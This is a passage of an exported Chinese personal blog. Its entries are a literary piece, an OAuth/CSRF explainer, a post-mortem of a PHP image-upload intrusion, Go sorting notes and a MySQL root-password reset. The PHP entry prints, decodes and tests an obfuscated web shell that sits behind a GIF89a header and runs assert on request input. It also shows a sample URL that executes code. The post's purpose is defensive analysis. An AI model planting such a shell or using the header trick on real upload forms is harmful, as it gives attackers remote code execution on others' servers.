<p>我总是无法理清人类生活的头绪。我从小在东北的乡间长大，初次见到火车，是年纪稍大后的事了。我在火车站的天桥上爬上爬下，满以为它是为了把车站建的像外国的游乐场一般复杂有趣，而特地打造的新潮设施。很长一段时间里，我对此深信不疑。在天桥上爬来爬去，曾是我最拿手的游戏。我原以为，那是铁路局最为贴心的服务之一。后来我发现，天桥不过是供乘客跨越铁路而设，只是一段实用性的阶梯，于是顿感索然无味。</p>
<p>此外，幼年的我在绘本中见到地铁，也不以为它是为实际需求而建，竟自认为比起地面上的车，地底下的车别出心裁、乐趣非凡，这应是地铁出现的缘由。</p>
<p>我自幼体弱多病，长期卧床在家。躺在床上，我笃定的认为这些床单、枕头套、被套都是单调乏味的装饰品。将满二十岁时，才得知这些竟也都是实用品。我颇感意外，对于人活于世的简朴，不禁悲从中来。</p>
<p>还有，我不懂得饥肠辘辘的滋味。不，我并非要傻乎乎的说明自己成长在不愁衣食的大户人家，只是我的确不曾体会饥饿之感。这样说来或许奇怪，我是那种即使饿了，也无法自察的人。中小学时，每当放学回家，周遭的人们总会七嘴八舌地吵着：“肚子饿了吧？我们都是过来人，放学回家的时候肚子总会饿的够戗。来电甜纳豆如何？还有蛋糕和面包哦。” 我也总会发挥自己与生俱来的讨好人的精神，嘴上说着“我饿了”，顺手把十颗甜纳豆扔进嘴里。但其实，那时的我对于饥饿一无所知。</p>
<p>当然我的食量并不小，记忆中却几乎不曾因饥饿而进食。我吃人们眼中的山珍海味，也吃众人艳羡的奢华之食。外出用餐时，总会勉强自己吃到撑。年幼之时，于我而言，最痛苦的时刻，莫过于在自家用餐的时候。</p>
<p>在乡下家中，每逢用餐，全家十余人的餐盘都分成相对的两列排开。身为幺子的我，自然坐在末座。用餐的房间光线暗淡，午饭时，十几位家人默默坐在桌前扒饭，这光景总是让我不寒而栗。我家是传统守旧的乡下家庭，菜色大都墨守成规，我渐渐对山珍海味或奢华之食不再抱有期待，最终竟觉得吃饭的时刻是可怖的。我坐在那幽暗房间的餐桌末端，因恐惧而寒战连连，把饭食一点点强压进口中，闷想着：“人为何一天非吃三餐不可？” 每个人吃饭时都表情严肃，用餐俨然如某种仪式：一家人必须得每日三次，准时聚集到一间幽暗的屋中。餐盘的顺序要摆放正确，即使并不饿，也必须沉默着低头咀嚼饭食。以至于我曾以为，这是在向家中蠢蠢欲动的亡灵们祈祷。</p>
<span id="more"></span>
<p>在我听来，“人不吃饭就会死” 这句话不过是可恶的恐吓之词。然而，这种迷信的说法（到现在我仍觉得这像是某种迷信）却总能给我带来不安和恐惧。人不吃饭就会死，所以必须劳动、吃饭——对我来说，再也没有比这更让我觉得艰涩难懂、更具有胁迫感的话语了。</p>
<p>即是说，我对人类的行为，至今仍不能理解。我的幸福观与世人几乎大相径庭。为此，我深感不安，夜夜辗转反侧、呻吟不止，甚至精神发狂。我究竟能否称得上是个幸福的人呢？自幼时起，就常常有人说我幸福，我却总觉得自己有如身陷炼狱，那些说我幸福的人在我看来反而比我幸福许多，她们安乐的生活远非我所能比拟。</p>
<p>我甚至曾认为，自己背负着十个灾祸。若任意将其总一个交与旁人背负，恐怕都足以令人丧命。</p>
<p>总之，我不懂。旁人承受的痛苦的性质和大小，我完全琢磨不透。现实生活中的痛苦只是吃个饭就能化解的痛苦，或许才是莫大的痛苦。也许，我刚才所说的那十个灾祸在这些痛苦面前，不值一提。也许那些我无法理解的痛苦才是凄惨的阿鼻地狱，果真如此吗？我不知道。但即使如此，那些人依然不想轻生、不会发狂，纵谈政治、毫不绝望、毫不屈服、继续与生活作战。他们不觉得痛苦吗？他们变得自私自利，甚至视其为理所当然，难道从未怀疑过自己？若真如此，那真是快活。不是每个人都如此吧？真的都满足于此吗？我不知道… 在夜里酣然入睡，一早醒来就会神清气爽吗？他们做了怎样的梦？走路时想些什么？想着钱的事？不会仅此而已吧？我似乎听过”民以食为天”，却从未停过”人为钱而活”。不，也许因人而异吧… 我还是搞不懂… 思绪渐感困惑之时，我愈发惶恐不安，彷佛自己是这世上的异类。我与旁人几乎无法交谈，因我既不知该谈些什么，也不知该从何谈起。</p>
<p>于是我想到一个办法，就是用滑稽的言行讨好他人。</p>
<p>那是我对人类最后的求爱。我极度恐惧人类的同时，却无论如何也无法对人类死心。于是，我靠滑稽这跟细线，维系着与人类的联系。表面上我总是笑脸迎人，可心里头，却是拼死拼活，在凶多吉少、千钧一发的高难度下，汗流浃背的为人类提供最周详的服务。</p>
<p>我的家人有多痛苦？为了生计他们在思考些什么？自孩提时起，我就对这些事一无所知，只是畏缩着，不堪承受家人之间的隔膜，因此我从小练就了取悦他人的本领。换言之，不知从何时起，我成了一个不说半句真话的孩子。</p>
<p>翻看那时与家人的合照便可发现，其他人都一本正经，只有我一个人，必定笑的诡异而扭曲。那是我取悦他人的一种幼稚而可悲的方式。</p>
<p>而且，无论我被家人怎样责怪，也从不还嘴。哪怕是戏言，于我也如晴天霹雳，令我为之疯狂，哪里还谈得上还嘴？我深信，他们的责备才是亘古不变的”人间真理”，只是我无力践行真理，无法与人共处。因此，我无力反驳，也无法为自己辩解。只要被人批评，我就觉得对方说的一点都没错，是我自己想法有误。因此我总是黯然接受外界的攻击，内心却承受着疯狂的恐惧。</p>
<p>待续…</p>
]]></content>
      <categories>
        <category>文学</category>
      </categories>
  </entry>
  <entry>
    <title>OAuth授权与CSRF攻击</title>
    <url>/2017/02/08/oauth2-csrf/</url>
    <content><![CDATA[<h2 id="OAuth简介"><a href="#OAuth简介" class="headerlink" title="OAuth简介"></a>OAuth简介</h2><blockquote>
<p>OAuth是一个关于授权（authorization）的开放网络标准，在全世界得到广泛应用，目前的版本是2.0版。</p>
</blockquote>
<p>OAuth在”客户端”与”服务提供商”之间，设置了一个授权层（authorization layer）。”客户端”不能直接登录”服务提供商”，只能登录授权层，以此将用户与客户端区分开来。”客户端”登录授权层所用的令牌（token），与用户的密码不同。用户可以在登录的时候，指定授权层令牌的权限范围和有效期。<br>“客户端”登录授权层以后，”服务提供商”根据令牌的权限范围和有效期，向”客户端”开放用户储存的资料。</p>
<h2 id="OAuth授权流程"><a href="#OAuth授权流程" class="headerlink" title="OAuth授权流程"></a>OAuth授权流程</h2><p><img src="http://ogslmd0ql.bkt.clouddn.com/bg2014051203.png" alt="授权流程" title="OAuth授权流程"></p>
<ol>
<li>用户打开客户端以后，客户端要求用户给予授权</li>
<li><strong>用户同意给予客户端授权</strong></li>
<li>客户端使用上一步获得的授权，向认证服务器申请令牌</li>
<li>认证服务器对客户端进行认证以后，确认无误，同意发放令牌</li>
<li>客户端使用令牌，向资源服务器申请获取资源</li>
<li>资源服务器确认令牌无误，同意向客户端开放资源</li>
</ol>
<p>不难看出来，上面六个步骤之中，2是关键，即用户怎样才能给于客户端授权。有了这个授权以后，客户端就可以获取令牌，进而凭令牌获取资源。</p>
<h2 id="获取授权的四种模式"><a href="#获取授权的四种模式" class="headerlink" title="获取授权的四种模式"></a>获取授权的四种模式</h2><p>客户端必须得到用户的授权（authorization grant），才能获得令牌（access token）。OAuth 2.0定义了四种授权方式。</p>
<ul>
<li>授权码模式（authorization code）</li>
<li>简化模式（implicit）</li>
<li>密码模式（resource owner password credentials）</li>
<li>客户端模式（client credentials）</li>
</ul>
<span id="more"></span>

<p>授权码模式（authorization code）是功能最完整、流程最严密的授权模式，也是目前大多数平台所使用的方式。它的特点就是通过客户端的后台服务器，与”服务提供商”的认证服务器进行互动。下面就只记录该模式的逻辑。</p>
<h2 id="授权码模式（authorization-code）"><a href="#授权码模式（authorization-code）" class="headerlink" title="授权码模式（authorization code）"></a>授权码模式（authorization code）</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><img src="http://ogslmd0ql.bkt.clouddn.com/bg2014051204.png" alt="授权码流程" title="流程"></p>
<p>步骤如下：</p>
<ol>
<li>用户访问客户端，后者将前者导向认证服务器。</li>
<li>用户选择是否给予客户端授权。</li>
<li>假设用户给予授权，认证服务器将用户导向客户端事先指定的”重定向URI”（redirection URI），同时附上一个授权码。</li>
<li>客户端收到授权码，附上早先的”重定向URI”，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。</li>
<li>认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）。</li>
</ol>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><h4 id="A-客户端申请认证的URI"><a href="#A-客户端申请认证的URI" class="headerlink" title="A: 客户端申请认证的URI"></a>A: 客户端申请认证的URI</h4><ul>
<li>response_type：表示授权类型，必选项，此处的值固定为”code”</li>
<li>client_id：表示客户端的ID，必选项</li>
<li>redirect_uri：表示重定向URI，可选项</li>
<li>scope：表示申请的权限范围，可选项</li>
<li><strong>state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值</strong></li>
</ul>
<p>例：</p>
<pre><code>GET /authorize?response_type=code&amp;client_id=s6BhdRkqt3&amp;state=xyz&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1

Host: server.example.com
</code></pre>
<h4 id="C-服务器回应客户端的URI"><a href="#C-服务器回应客户端的URI" class="headerlink" title="C: 服务器回应客户端的URI"></a>C: 服务器回应客户端的URI</h4><ul>
<li>code：表示授权码，必选项。该码的有效期应该很短，通常设为10分钟，客户端只能使用该码一次，否则会被授权服务器拒绝。该码与客户端ID和重定向URI，是一一对应关系</li>
<li><strong>state：如果客户端的请求中包含这个参数，认证服务器的回应也必须一模一样包含这个参数</strong></li>
</ul>
<p>例:</p>
<pre><code>HTTP/1.1 302 Found

Location: https://client.example.com/cb?code=SplxlOBeZQQYbYS6WxSbIA&amp;state=xyz
</code></pre>
<h4 id="D-客户端向认证服务器申请令牌的HTTP请求"><a href="#D-客户端向认证服务器申请令牌的HTTP请求" class="headerlink" title="D: 客户端向认证服务器申请令牌的HTTP请求"></a>D: 客户端向认证服务器申请令牌的HTTP请求</h4><ul>
<li>grant_type：表示使用的授权模式，必选项，此处的值固定为”authorization_code”</li>
<li>code：表示上一步获得的授权码，必选项</li>
<li>redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致</li>
<li>client_id：表示客户端ID，必选项</li>
</ul>
<p>例: </p>
<pre><code>POST /token HTTP/1.1

Host: server.example.com

Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW

Content-Type: application/x-www-form-urlencoded


grant_type=authorization_code&amp;code=SplxlOBeZQQYbYS6WxSbIA
&amp;redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb
</code></pre>
<h4 id="E-认证服务器发送的HTTP回复"><a href="#E-认证服务器发送的HTTP回复" class="headerlink" title="E: 认证服务器发送的HTTP回复"></a>E: 认证服务器发送的HTTP回复</h4><ul>
<li>access_token：表示访问令牌，必选项</li>
<li>token_type：表示令牌类型，该值大小写不敏感，必选项，可以是bearer类型或mac类型</li>
<li>expires_in：表示过期时间，单位为秒如果省略该参数，必须其他方式设置过期时间</li>
<li>refresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项</li>
<li>scope：表示权限范围，如果与客户端申请的范围一致，此项可省略</li>
</ul>
<p>例: </p>
<pre><code>HTTP/1.1 200 OK
Content-Type: application/json;charset=UTF-8
Cache-Control: no-store
Pragma: no-cache

&#123;
  &quot;access_token&quot;:&quot;2YotnFZFEjr1zCsicMWpAA&quot;,
  &quot;token_type&quot;:&quot;example&quot;,
  &quot;expires_in&quot;:3600,
  &quot;refresh_token&quot;:&quot;tGzv3JOkF0XG5Qx2TlKWIA&quot;,
  &quot;example_parameter&quot;:&quot;example_value&quot;
&#125;
</code></pre>
<p>从上面代码可以看到，相关参数使用JSON格式发送（Content-Type: application/json）。此外，HTTP头信息中明确指定不得缓存。</p>
<p>在做 OAuth 的时候，开发者的安全意识不高的话，很可能会忽略 <strong>state</strong> 参数，从而导致出现 <strong>csrf漏洞</strong>, 出现的原因如下</p>
<h3 id="忽略state参数导致的CSRF漏洞"><a href="#忽略state参数导致的CSRF漏洞" class="headerlink" title="忽略state参数导致的CSRF漏洞"></a>忽略state参数导致的CSRF漏洞</h3><h4 id="攻击逻辑"><a href="#攻击逻辑" class="headerlink" title="攻击逻辑"></a>攻击逻辑</h4><p><img src="http://ogslmd0ql.bkt.clouddn.com/687474703a2f2f3778727a6c6d2e636f6d312e7a302e676c622e636c6f7564646e2e636f6d2f63737266312e6a7067.jpeg" alt="攻击逻辑" title="攻击逻辑"></p>
<p>授权码流程中的第三步<code>假设用户给予授权，认证服务器将用户导向客户端事先指定的&quot;重定向URI&quot;（redirection URI），同时附上一个授权码</code>， 举例来说， A用户登录 <a href="http://www.bmob.cn/">比目官网</a> 之后， 点击绑定 <a href="https://www.github.com/">github</a> 的按钮， 同意授权之后github会跳回比目链接， 链接带有授权码， 比目服务器会根据拿到的code来调取github接口获取A用户的github平台的openid， 并且将该github账号绑定至该比目账号， 这个是大略的绑定流程。</p>
<p>问题在于github授权完成跳回bmob的带有code的重定向URI对于bmob服务器来说是无状态的， 该code标识的只是A用户在github平台的唯一性， 所以如果A用户在拿到重定向URI之后立即中断浏览器的执行而将该链接发给B用户， 如果B用户恰好也已经登录了bmob， 那bmob服务器依然会正常执行绑定流程， 即通过该URI中A的code调用github接口获取到A的openid， 结果就是使用A的github账号绑定了B的bmob账号， 即现在A可以通过自己的github账号登录B的bmob账号，从而完成了CSRF攻击。</p>
<h4 id="使用state参数防止CSRF攻击"><a href="#使用state参数防止CSRF攻击" class="headerlink" title="使用state参数防止CSRF攻击"></a>使用state参数防止CSRF攻击</h4><p>上述攻击的关键就在于bmob服务器无法判断由github重定向回的URI是否是当前登录用户B所发起的授权，而state参数就是为此服务，即通过state参数来判断code是否合法。</p>
<p>具体做法是bmob在授权码流程第一步中生成一个 <strong>唯一的随机数(state)</strong> 存入当前用户的session中，并传给github接口，回调时该state参数会随code一起返回给bmob服务器，bmob服务器则可以通过github回调传回的state参数和当前登录用户session中的state参数对比来判断是否合法。比如上面那个例子中A将回调的URI发给B，B用户打开此链接之后比目服务器会判断到用户B的session中并不存在state值或不等于回调的state值，从而阻挡了CSRF攻击。</p>
<p>即：<strong>回调时对用户session中state值和回调URI中的state参数做判空操作和对比</strong></p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>如上可知其实针对oauth做CSRF攻击条件也是比较苛刻的</p>
<ul>
<li>攻击者必须了解第三方网站可能的 <strong>绑定特性</strong>，否则攻击极可能失败。绝大多数网站都是一个网站账号只能绑定一个OAuth提供方账号（比如微博帐号）。这种特性，导致这个漏洞在绝大多数网站根本无法快速撒网，只能定向劫持未绑定的用户到攻击者OAuth账号上，而攻击一次后，这个账号必须解绑才能用于别的攻击，导致利用难度增大不少。</li>
<li>攻击者还必须了解被定向劫持用户的上网习惯。在这个漏洞中，绝大部分都需要受害者在第三方网站上处于 <strong>登录状态</strong>，否则攻击基本失效。</li>
<li>攻击者还必须了解第三方网站、以及用户在该第三方网站上存在的利益。现在的攻击有许多都是带有利益的，如果是电商类的话，网站本身的金钱利益驱动可能存在，但又需要判断该用户在该网站是否存在高价值，这就增加了额外的工作量；如果只是娱乐类网站，除了言论相关和用户所拥有的网站管理权，我还想不出有什么可以吸引攻击者去定向攻击。</li>
</ul>
<p>另一方面即说明 <strong>利用OAuth进行CSRF攻击不用发生在第三方登录上面</strong>，不过遵守OAuth协议规则使用state参数也是一个好的编码习惯，任何场景都有此必要。</p>
<p><br/><br/><br/><br/><br/><br/><br/><br>参考：</p>
<blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html">理解OAuth 2.0 - 阮一峰</a></p>
<p><a href="https://github.com/pzxwhc/MineKnowContainer/issues/68">OAuth2：忽略 state 参数引发的 csrf 漏洞 - pzxwhc</a></p>
</blockquote>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>oauth</tag>
        <tag>csrf</tag>
      </tags>
  </entry>
  <entry>
    <title>一次PHP图片上传验证不严谨引发的血案</title>
    <url>/2017/07/05/php-upload-image-security/</url>
    <content><![CDATA[<p>之前做过一个项目涉及到用户上传图片，当时项目比较小且一个人做就没用框架。上传这部分的验证综合服务器没有安装<code>exif</code>、<code>gd</code>扩展就简单根据 <strong><code>getimagesize</code></strong>(<a href="http://php.net/manual/zh/function.getimagesize.php">文档</a>) 函数是否返回false判断，后面出现了问题。</p>
<p>有天一位前同事告知这个项目被朋友hack注入了脚本，就是通过上传操作。</p>
<p>我登入服务器相应目录，根据时间排序发现了可疑文件，后缀名竟然是 <code>.php</code>，矮油我去，赶紧download下来并删除(线上先暂时加了后缀名验证)，打开一看:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="variable">$bSzrL</span>= <span class="string">&quot;s\x74r\x5fr\x65\x70lac\x65&quot;</span>;</span><br><span class="line">    @<span class="variable">$VwissV</span>= @<span class="variable">$bSzrL</span>(<span class="string">&#x27;drApO&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;adrApOrdrApOraydrApO_drApOmdrApOap&#x27;</span>);</span><br><span class="line">    @<span class="variable">$ZXNFh</span>= @<span class="variable">$bSzrL</span>(<span class="string">&#x27;DBCFzQ&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;asseDBCFzQrDBCFzQt&#x27;</span>);</span><br><span class="line">    @<span class="variable">$VwissV</span>(@<span class="variable">$ZXNFh</span>,(<span class="keyword">array</span>)@<span class="variable">$_REQUEST</span>[<span class="string">&#x27;csqing123&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>毕竟学识浅薄，没搞过别人也没别人搞过，不太熟悉其中的套路，傻眼了两秒。</p>
<span id="more"></span>
<p>先不管文件中的那些不规则字符变量，问题应该是出在文件开头的 <code>GIF89a</code>。本地测试直接使用<code>getimagesize</code>函数，<code>var_dump</code>出来:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  int(3360)</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  int(15370)</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(27) &quot;width=&quot;3360&quot; height=&quot;15370&quot;&quot;</span><br><span class="line">  [&quot;channels&quot;]=&gt;</span><br><span class="line">  int(3)</span><br><span class="line">  [&quot;mime&quot;]=&gt;</span><br><span class="line">  string(9) &quot;image/gif&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这尼玛<code>getimagesize</code>表示也很无奈，然后使用<code>exif_imagetype</code>处理打印出来是1，即常量<code>IMAGETYPE_GIF</code>的值，看来<code>exif</code>扩展也沦陷了。不慌，接着试<code>finfo_open</code>，欣慰的是伴随着一串串的 notice 和 warning, 脚本返回了<code>false</code>，完美。</p>
<p>原因暂时找到了，接着就是探究文件头的罪魁祸首 <code>GIF89a</code>。查到百科:<br><a href="https://en.wikipedia.org/wiki/Magic_number_(programming)">Magic number</a></p>
<blockquote>
<p>Compiled Java class files (bytecode) and Mach-O binaries start with hex CAFEBABE. When compressed with Pack200 the bytes are changed to CAFED00D.</p>
<p>GIF image files have the ASCII code for “GIF89a” (47 49 46 38 39 61) or “GIF87a” (47 49 46 38 37 61)</p>
<p>JPEG image files begin with FF D8 and end with FF D9. JPEG/JFIF files contain the ASCII code for “JFIF” (4A 46 49 46) as a null terminated string. JPEG/Exif files contain the ASCII code for “Exif” (45 78 69 66) also as a null terminated string, followed by more metadata about the file.</p>
<p>PNG image files begin with an 8-byte signature which identifies the file as a PNG file and allows detection of common file transfer problems: \211 P N G \r \n \032 \n (89 50 4E 47 0D 0A 1A 0A). That signature contains various newline characters to permit detecting unwarranted automated newline conversions, such as transferring the file using FTP with the ASCII transfer mode instead of the binary mode.[5]</p>
</blockquote>
<p>大致意思是某些特定的文件含有特定的某些字符，而GIF文件的特殊字符是<code>GIF89a</code>,<code>GIF87a</code>。由此可推算<code>getimagesize</code>和<code>exif_imagetype</code>可能就是被文件头部的特殊字符误导判断为GIF文件。*(我试了下把文件头的6个字符删得只剩GIF3个字符后依然存在问题 todo)*</p>
<p>如果要继续探究这两个有问题的函数的话，得去读源码，大致可以猜到有匹配文件头的N个字符去判断有关。</p>
<p>没完，继续。</p>
<p><code>GIF89a</code>后面那些几乎没有可读性的PHP代码究竟是什么？</p>
<p>简单把变量打印出来便知：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    @<span class="variable">$bSzrL</span>= <span class="string">&quot;s\x74r\x5fr\x65\x70lac\x65&quot;</span>;</span><br><span class="line">    @<span class="variable">$VwissV</span>= @<span class="variable">$bSzrL</span>(<span class="string">&#x27;drApO&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;adrApOrdrApOraydrApO_drApOmdrApOap&#x27;</span>);</span><br><span class="line">    @<span class="variable">$ZXNFh</span>= @<span class="variable">$bSzrL</span>(<span class="string">&#x27;DBCFzQ&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;asseDBCFzQrDBCFzQt&#x27;</span>);</span><br><span class="line">    @<span class="variable">$VwissV</span>(@<span class="variable">$ZXNFh</span>,(<span class="keyword">array</span>)@<span class="variable">$_REQUEST</span>[<span class="string">&#x27;csqing123&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$bSzrL</span>, <span class="variable">$VwissV</span>, <span class="variable">$ZXNFh</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印结果</span></span><br><span class="line">    <span class="comment">// string(11) &quot;str_replace&quot;</span></span><br><span class="line">    <span class="comment">// string(9) &quot;array_map&quot;</span></span><br><span class="line">    <span class="comment">// string(6) &quot;assert&quot;</span></span><br></pre></td></tr></table></figure>

<p>原来<code>\x74</code>,<code>\x5f</code>这些鬼字符串是<strong>十六进制</strong>，双引号下自动解析为相应的字符，查进制表就看到 <code>\x74</code> -&gt; <code>t</code>, <code>\x5f</code> -&gt; <code>_</code>, 其他同理。</p>
<p>最后经过处理，主要逻辑就一句话：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">array_map</span>(`assert`, (<span class="keyword">array</span>)<span class="variable">$_REQUEST</span>[<span class="string">&#x27;csqing123&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>即黑客可<strong>通过开头上传的脚本文件通过<code>assert</code>函数执行任何PHP语句</strong>，如：<a href="http://www.myproject.com/uploads/hacker.php?csqing123=exit">http://www.myproject.com/uploads/hacker.php?csqing123=exit</a>(‘u r hacked’)。</p>
<p>可怕吧。</p>
<p>说回正事，上传的图片究竟该如何验证？GIF有此问题，保不准其他类型的图片文件也存在。首先先排除掉 <code>getimagesize</code>,<code>exif_imagetype</code> 这两个函数，蛋疼的是我在 stackoverflow 上看到相关问题顶在最上面的回答很多都是用这俩。当然前面测试通过的<code>finfo</code>扩展可以，也看到有鬼佬建议用户所有上传的图片都通过<code>gd</code>库验证并转化为统一的比如<code>png</code>格式的图片，虽然比较耗CPU资源，但一方面文件类型统一方便处理，另一方面绝对保证了图片文件类型的安全性，也不失为一个方向吧。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>不可单纯依赖<code>getimagesize</code>,<code>exif_imagetype</code>这两个函数判断文件是否为图片(至少GIF图片)</p>
<p><br/><br/><br/></p>
<p>参考资料：</p>
<blockquote>
<p><a href="https://en.wikipedia.org/wiki/Magic_number_(programming)">Magic_number, 魔术数字</a></p>
<p><a href="https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_61/com.ibm.aix.networkcomm/conversion_table.htm">ASCII，十进制，十六进制，八进制和二进制转换表</a></p>
<p><a href="https://stackoverflow.com/questions/9314164/php-uploading-files-image-only-checking">PHP Uploading files - image only checking</a></p>
<p><a href="https://stackoverflow.com/questions/2486329/how-can-i-only-allow-certain-filetypes-on-upload-in-php">How can I only allow certain filetypes on upload in php?</a></p>
</blockquote>
]]></content>
      <categories>
        <category>PHP</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>upload</tag>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>Go by Example - Stateful Goroutines</title>
    <url>/2018/02/06/go-by-example-stateful-goroutines/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Stateful-Goroutines"><a href="#Go-by-Example-Stateful-Goroutines" class="headerlink" title="Go by Example: Stateful Goroutines"></a><center>Go by Example: Stateful Goroutines</center></h2><p>未完待续…</p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Sorting</title>
    <url>/2019/04/13/go-by-example-sorting/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Sorting"><a href="#Go-by-Example-Sorting" class="headerlink" title="Go by Example: Sorting"></a><center>Go by Example: Sorting</center></h2><p>golang的<code>sort</code>包可以对内置类型和用户定义的类型进行排序操作，接下来我们先看下内置类型。</p>
<span id="more"></span>

<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sort&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Sort包适用于特定的内置类型</span></span><br><span class="line">    <span class="comment">// 这里是字符串排序的示例，需要注意排序改变的是变量的值，该方法并不会返回一个新的值</span></span><br><span class="line">    strs := []<span class="type">string</span>&#123;<span class="string">&quot;c&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>&#125;</span><br><span class="line">    sort.Strings(strs)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Strings:&quot;</span>, strs)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这里是整数排序的示例</span></span><br><span class="line">    ints := []<span class="type">int</span>&#123;<span class="number">7</span>, <span class="number">2</span>, <span class="number">4</span>&#125;</span><br><span class="line">    sort.Ints(ints)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Ints:&quot;</span>, ints)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 还可以用Sort包判断一个切片是否有序</span></span><br><span class="line">    s := sort.IntsAreSorted(ints)</span><br><span class="line">    fmt.Println(<span class="string">&quot;Sorted:&quot;</span>, s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run sorting.go</span><br><span class="line">Strings: [a b c]</span><br><span class="line">Ints: [2 4 7]</span><br><span class="line">Sorted: <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/sorting">Go by Example: Slices</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>重置MySQL root密码</title>
    <url>/2016/12/19/reset-mysql-root-password/</url>
    <content><![CDATA[<p>OSX(brew)环境重置MySQL的root用户密码   </p>
<h4 id="停止MySQL服务"><a href="#停止MySQL服务" class="headerlink" title="停止MySQL服务"></a>停止MySQL服务</h4><p><code>$ brew services stop mysql</code></p>
<h4 id="启动MySQL安全模式"><a href="#启动MySQL安全模式" class="headerlink" title="启动MySQL安全模式"></a>启动MySQL安全模式</h4><p><code>$ mysqld_safe --skip-grant-tables</code>  </p>
<p>‘–skip-grant-tables’ 参数会忽略权限验证及免密码登录</p>
<h4 id="登入MySQL"><a href="#登入MySQL" class="headerlink" title="登入MySQL"></a>登入MySQL</h4><p><code>$ mysql</code></p>
<h4 id="修改root用户密码"><a href="#修改root用户密码" class="headerlink" title="修改root用户密码"></a>修改root用户密码</h4><p><code>mysql&gt; use mysql;</code><br><code>mysql&gt; update user set authentication_string=PASSWORD(&#39;your-new-password&#39;) where user=&#39;root&#39;;</code></p>
<h4 id="重启MySQL服务"><a href="#重启MySQL服务" class="headerlink" title="重启MySQL服务"></a>重启MySQL服务</h4><p><code>$ pkill mysqld</code><br><code>$ brew services start mysql</code></p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title>session的开启与关闭</title>
    <url>/2017/02/08/session-start-and-destroy/</url>
    <content><![CDATA[<h3 id="session-start"><a href="#session-start" class="headerlink" title="session start"></a>session start</h3><p>手工开启之前需先判断是否已经启动, 两种判断:</p>
